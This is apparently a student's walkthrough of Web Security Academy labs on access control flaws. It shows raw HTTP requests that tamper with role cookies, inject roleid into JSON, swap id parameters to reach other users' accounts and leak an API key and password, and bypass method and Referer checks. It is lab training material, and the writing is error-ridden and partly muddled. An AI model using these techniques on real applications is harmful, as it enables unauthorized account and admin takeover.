## Access control vulnerabilities
Access control (or authorization) is the application of constraints on who (or what) 
can perform attempted actions or access resources that they have requested. 
In the context of web applications, access control is dependent on authentication and session management: 
 
 ## 1. User role controlled by request parameter
 
 In Burp Proxy, turn interception on and enable response interception
 
 Complete and submit the login page, and forward the resulting request in Burp.
 
 Observe that the response sets the cookie Admin=false. Change it to Admin=true. 
 
 Acess The directory
 
 
 ## 2. User role can be modified in user profile
 
 Request Sand to repeter 
 
 Observe that the response contains your role ID.
 
 Send the email submission request to Burp Repeater, add "roleid":2 into the JSON in the request body, and resend it. 
 
 Observe that the response shows your roleid has changed to 2.
 
 ## Request 

    POST /my-account/change-email HTTP/1.1
    Host: 0af600bd034d16ccc01622bd007500ff.web-security-academy.net
    Cookie: session=BtwJhdFHvFMf80vO1cbyBAFzL6fR2Ybb
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: text/plain;charset=UTF-8
    Content-Length: 37
    Origin: https://0af600bd034d16ccc01622bd007500ff.web-security-academy.net
    Referer: https://0af600bd034d16ccc01622bd007500ff.web-security-academy.net/my-account?id=wiener
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers
    Connection: close

    {"email":"asif@khan.com"}
    
 ## Respotion
 
     HTTP/1.1 302 Found
     Location: /my-account
     Content-Type: application/json; charset=utf-8
     Connection: close
     Content-Length: 117

     {
     "username": "wiener",
     "email": "asif@khan.com",
     "apikey": "NGFEeqrDx0HZQVetlEiJE0KRhlbdsakQ",
     "roleid": 1
     }
    
 So Add the some code 
 
     "roleid":2
     
  Add some code and sand the request 
  
    POST /my-account/change-email HTTP/1.1
    Host: 0aa4005804b0d687c0b734a5008300b5.web-security-academy.net
    Cookie: session=m3KQEsfQs1feSrzPlZLIYH6nocktj0In
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: text/plain;charset=UTF-8
    Content-Length: 38
    Origin: https://0aa4005804b0d687c0b734a5008300b5.web-security-academy.net
    Referer: https://0aa4005804b0d687c0b734a5008300b5.web-security-academy.net/my-account
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers
    Connection: close

    {"email":"asif@khan.com",
     "roleid":2}
     
  Accept the request, This is vulnerable


 ## 3. User ID controlled by request parameter 
 
  Log in using the supplied credentials and go to your account page.
  
  Note that the URL contains your username in the "id" parameter. 
  
  Send the request to Burp Repeater.
  
  Change the "id" parameter and sand the server accept the request, This is vulnerability
  
    GET /my-account?id=asif HTTP/1.1
    Host: 0a3f0064038d99a1c0d1738b007b0085.web-security-academy.net
    Cookie: session=NN4wD7kCq0mi8vnkAdVwEg9TkEMZYlSd
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0a3f0064038d99a1c0d1738b007b0085.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close


 ## Change Parameter ID 
 
     GET /my-account?id=asif HTTP/1.1


## 4. User ID controlled by request parameter, with unpredictable user IDs

   Find a blog post by carlos.
   
   Click on carlos and observe that the URL contains his user ID. Make a note of this ID.
   
   Change the "id" parameter to the saved user ID. 
   
   Accept the request, This is vulnerable
   
 ## Request 
 
    GET /my-account?id=62cae48d-fa7e-43a1-810a-8d3edcb5b449 HTTP/1.1
    Host: 0a300096047fe477c0d9261500590058.web-security-academy.net
    Cookie: session=wW0hPlgsA25dMoB1jfIJCvY7PiK38r0l
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0a300096047fe477c0d9261500590058.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
   Te: trailers
   Connection: close
   
   
Check The Header Show ID 

    GET /my-account?id=62cae48d-fa7e-43a1-810a-8d3edcb5b449 HTTP/1.1
   
   
 ## 5. User ID controlled by request parameter with data leakage in redirect
 
  Log in using the supplied credentials and access your account page. 
  
  Send the request to Burp Repeater. 
  
  Change the "id" parameter to asif. 
   
  Observe that although the response is now redirecting you to the home page, it has a body containing the API key belonging to asif.
  
  
 ## Request 
 
    GET /my-account?id=asif HTTP/1.1
    Host: 0aaf003204d8ede2c04a33d50003008a.web-security-academy.net
    Cookie: session=EFpwsC5e6EhLdrxHM7ImktzSjMeuFgUq
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0aaf003204d8ede2c04a33d50003008a.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close
   
 Check The Header Show the username so change the username, Aceppet the request, This is vulnerable
 
    GET /my-account?id=asif HTTP/1.1
     
     
     
 ## 6.  User ID controlled by request parameter with password disclosure
 
  Log in using the supplied credentials and access the user account page
    
  Change the "id" parameter in the URL to administrator. 
    
  View the response in Burp and observe that it contains the administrator's password.
    
 ## Request 
 
    GET /my-account?id=asif HTTP/1.1
    Host: 0a5800870333c4eac027bb34005e00c2.web-security-academy.net
    Cookie: session=DqtzHbQyCH395bnMAVQZyyjkrPnUts0Z
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0a5800870333c4eac027bb34005e00c2.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close
     
 Check The Header Show the username so change the username, Aceppet the request, This is vulnerable
  
    GET /my-account?id=asif HTTP/1.1
 
 Click The Update Password and request sand the burp, and show the password 
 
    POST /my-account/change-password HTTP/1.1
    Host: 0a5800870333c4eac027bb34005e00c2.web-security-academy.net
    Cookie: session=DqtzHbQyCH395bnMAVQZyyjkrPnUts0Z
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 67
    Origin: https://0a5800870333c4eac027bb34005e00c2.web-security-academy.net
    Referer: https://0a5800870333c4eac027bb34005e00c2.web-security-academy.net/my-account?id=wiener
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    csrf=RsQYgpYz7H7wqpp7PNGFDvwLPqA7GhJC&password=mi6zzypslh7wkqay3os3
   
   
   
   
 ## 7. Method-based access control can be circumvented
 
   Create two account, one Privilege and secand is Local User 
   
   Copy The Local user Cookie :session, and past the Privilege account Cookie :session, And sand the request is server
   
   observe that the response says "Unauthorized". 
   
   Change the method from POST to POSTX and observe that the response changes to "missing parameter".
   
   Convert the request to use the GET method by right-clicking and selecting "Change request method". 
   
   
   
   
## 8. Multi-step process with no access control on one step

  Create two account, one Privilege and secand is Local User 
 
  Copy the Local user's session cookie and past the Privilege user, and change the username, 
  
  sand the request to server, accept the request, This is    vulnerable
   
   
     
## 9. Referer-based access control 

   Create two account, one Privilege and secand is Local User 
   
   send the HTTP request to Burp Repeater
   
   Browse to /admin-roles?username=asif&action=upgrade
   
   and observe that the request is treated as unauthorized due to the absent Referer header.
   
   Copy the Local user session cookie into the existing Burp Repeater request, change the username to yours, and replay it. 
     
     
    GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
    Host: 0adf0050049b912fc0590c89008000d1.web-security-academy.net
    Cookie: session=rJx1TJ8LuyR3JD1EYR43W5OKaq5UtFM5
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close
     
     
 ## Change The Header
 
    GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
